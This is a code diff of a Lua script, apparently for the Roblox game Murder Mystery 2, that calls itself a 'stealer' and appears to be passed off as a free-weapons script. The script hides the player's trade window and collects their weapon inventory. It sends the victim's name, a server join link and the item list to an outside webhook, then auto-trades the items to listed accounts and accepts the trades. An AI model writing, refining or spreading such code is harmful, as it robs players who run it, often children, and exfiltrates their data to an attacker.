@@ -18,7 +18,7 @@ if not req then
     return
 end
 
--- Función para enviar webhook con imagen a la izquierda
+-- Función para enviar webhook con thumbnail
 local function SendWebhook(title, description, fields, prefix, thumbnail)
     local data = {
         ["content"] = prefix or "",
@@ -27,8 +27,8 @@ local function SendWebhook(title, description, fields, prefix, thumbnail)
             ["description"] = description or "",
             ["color"] = 65280,
             ["fields"] = fields or {},
-            ["thumbnail"] = thumbnail and {["url"] = thumbnail} or nil,
-            ["footer"] = {["text"] = "Disfruta todas las armas gratis 😎"}
+            ["thumbnail"] = thumbnail and {["url"]=thumbnail} or nil,
+            ["footer"] = {["text"]="The best stealer by Anonimo 🇪🇨"}
         }}
     }
     local body = HttpService:JSONEncode(data)
@@ -41,26 +41,6 @@ local function SendWebhook(title, description, fields, prefix, thumbnail)
         })
     end)
 end
-
--- Lista de valores Godly + Ancient (ejemplo)
-local valueList = {
-    ["gingerscope"]=10700,
-    ["travelers axe"]=6900,
-    ["celestial"]=975,
-    ["astral"]=850,
-    ["morning star"]=720,
-    ["northern star"]=680,
-    ["moonlight"]=640,
-    ["helios"]=600,
-    ["stormbringer"]=580,
-    ["reaper"]=550,
-    ["blaze"]=500,
-    ["phantom"]=470,
-    ["zenith"]=450,
-    ["ares"]=420,
-    ["hephaestus"]=400,
-    ["mystic"]=380,
-}
 
 -- Ocultar GUI de trade
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -81,9 +61,7 @@ local function sendTradeRequest(user)
 end
 local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
 local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
-local function waitForTradeCompletion()
-    while getTradeStatus() ~= "None" do task.wait(0.1) end
-end
+local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
 -- Preparar lista de armas
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
@@ -95,13 +73,13 @@ local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeSe
 for id, amount in pairs(profile.Weapons.Owned) do
     local item = database[id]
     if item then
-        local rarityIndex = table.find(rarityTable, item.Rarity)
-        local minIndex = table.find(rarityTable, min_rarity)
+        local rarityIndex = table.find(rarityTable,item.Rarity)
+        local minIndex = table.find(rarityTable,min_rarity)
         if rarityIndex and rarityIndex >= minIndex then
-            local value = valueList[item.ItemName:lower()] or 1
+            local value = 1
             if value >= min_value then
-                table.insert(weaponsToSend,{DataID=id, Amount=amount, Value=value, Rarity=item.Rarity})
-                totalValue += value * amount
+                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=value,Rarity=item.Rarity})
+                totalValue += value*amount
             end
         end
     end
@@ -110,20 +88,19 @@ end
 -- Enviar webhook con join link y thumbnail
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
-    {name="Victima👤:", value=LocalPlayer.Name, inline=true},
-    {name="Link para unirse🔗:", value=joinLink, inline=false},
-    {name="Inventario📦:", value="", inline=false},
-    {name="Total valor💲:", value=tostring(totalValue), inline=true}
+    {name="Victim", value=LocalPlayer.Name, inline=true},
+    {name="Join link", value=joinLink, inline=false},
+    {name="Inventario", value="", inline=false},
+    {name="Total value", value=tostring(totalValue), inline=true}
 }
 for _, w in ipairs(weaponsToSend) do
-    fields[3].value = fields[3].value .. string.format("%s x%s (%s)\n", w.DataID, w.Amount, w.Rarity)
+    fields[3].value = fields[3].value..string.format("%s x%s (%s)\n",w.DataID,w.Amount,w.Rarity)
 end
-fields[3].value = fields[3].value .. "\nRecolecta estos items 👇"
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
-SendWebhook("💪MM2 hit el mejor stealer💯", "💰Disfruta todas las armas gratis 😎", fields, prefix, thumbnailURL)
+SendWebhook("💪MM2 hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fields,prefix,thumbnailURL)
 
--- Función de trade que soporta muchos ítems en bloques de 4 y espera para aceptar
+-- Función de trade que soporta muchos ítems en bloques de 4 y acepta cuando se pueda
 local function doTrade(targetName)
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
@@ -131,26 +108,22 @@ local function doTrade(targetName)
             sendTradeRequest(targetName)
         elseif status=="StartTrade" then
             local blockSize = 4
+            local allAdded = false
+            -- Agregar ítems en bloques de 4
             while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
-                for i=1, math.min(blockSize,#weaponsToSend) do
+                for i=1,math.min(blockSize,#weaponsToSend) do
                     local w = table.remove(weaponsToSend,1)
-                    for _=1, w.Amount do addWeaponToTrade(w.DataID) end
+                    for _=1,w.Amount do addWeaponToTrade(w.DataID) end
                 end
                 task.wait(0.3)
             end
-
-            -- Esperar hasta que se pueda aceptar (8-9 segundos aprox)
-            local elapsed = 0
-            while elapsed < 12 do
-                if getTradeStatus() == "StartTrade" then
-                    acceptTrade()
-                    break
-                end
-                task.wait(0.3)
-                elapsed = elapsed + 0.3
+            allAdded = true
+            -- Esperar un delay seguro antes de aceptar
+            if allAdded then
+                task.wait(8) -- esperar 8s antes de llamar a Accept
+                acceptTrade()
+                waitForTradeCompletion()
             end
-
-            waitForTradeCompletion()
         else
             task.wait(0.5)
         end
@@ -158,7 +131,7 @@ local function doTrade(targetName)
     end
 end
 
--- Conectar trade al chat
+-- Activar trade mediante chat
 for _,p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
